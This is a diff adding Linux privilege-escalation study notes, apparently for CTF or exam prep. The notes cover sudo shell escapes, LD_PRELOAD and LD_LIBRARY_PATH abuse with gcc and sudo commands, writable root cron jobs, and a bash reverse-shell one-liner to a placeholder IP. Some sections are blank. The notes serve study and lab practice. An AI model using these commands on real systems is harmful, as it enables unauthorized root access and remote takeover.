@@ -250,15 +250,53 @@ create function do_system returns integer soname 'raptor_udf2.so';
     
 ### Sudo
 1. Sudo Shell Escape Sequences
-    - Description: 
+    - Description: if `sudo -l` doesn't require passwords, or that we know the low priv password to access `sudo -l` and there are commands that the low priv user is allowed to do as `root` or `sudo` group, then we may try and utlize these commands to launch a root shell
     - Requirements: 
+      - `sudo -l` can be access either without password or with a low priv user password that we know
+      - one of the commands can be found on [gtfoBins](https://gtfobins.github.io/)
+        - even if its not, such as apache, we can try and abuse its certain functionalities to load configuration files to see the first line of any senstive files aka `/etc/shadow`
     - Related instructions: 
+       - please refer to  [gtfoBins](https://gtfobins.github.io/) for detail instructions on sudo shell escape sequences
+       
 2. Sudo Environment Variables
-    - Description: 
+    - Description: `sudo` can be configured to inherit environment variables from the user's environment. `LD_PRELOAD` and `LD_LIBRARY_PATH` are the most dangerous environment variables to inherit, if they are inherited by the `env_keep` option, we can abuse this to load our own library and or share object file that can execute as `sudo` privs
     - Requirements: 
+        - sudo -l` can be access either without password or with a low priv user password that we know
+        - `LD_PRELOAD` and `LD_LIBRARY_PATH` env variables must be inherited from the user's environment with the `env_keep` option inside the sudo file
     - Related instructions: 
+        - compiling preload shared object file and setting it with the `sudo` command
+        ```
+        # note that -fPIC flag is needed for x64 systems
+        gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+        sudo LD_PRELOAD=/tmp/preload.so program-name-here
+        ```
+        - finding out what a program uses for its linked libraries with ldd: `ldd /path/to/binary`
+        - compiling a shared object library file and pointing the LD_LIBRARY_PATH to our shared object library file directory and running our command while setting the environment variable
+        
+        ```
+        gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+
+        sudo LD_LIBRARY_PATH=/tmp apache2
+        ```
     
 ### Cronjobs
+1. File Permissions
+    - Description: if there are crontabs (usually systemwide inside `/etc/crontab`) that are owned by root and writable to the low priv user, we can overwrite the cronjob to execute what we wwant as root (when the cronjob executes)
+    - Requirements: 
+        - must be a cronjob that is owned by root
+        - the cronjob must run in a reasonable time (for CTF and exam purposes)
+        - the cronjob must be writable by the low priv user account we are in
+    - Related instructions: 
+        - quick reverse shell using bash: `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
+    
+2. PATH Environment Variable
+    - Description: crontab can also specify a PATH variable that each conrjob inherits and executes commands from, if the one of the PATH (from the beginning) is writable by low priv user, we can write a script inside that directory to execute before the actual command reaches
+    - Requirements: 
+    - Related instructions: 
+3. Wildcards
+    - Description: 
+    - Requirements: 
+    - Related instructions: 
 
 
 ### SUID/GUID
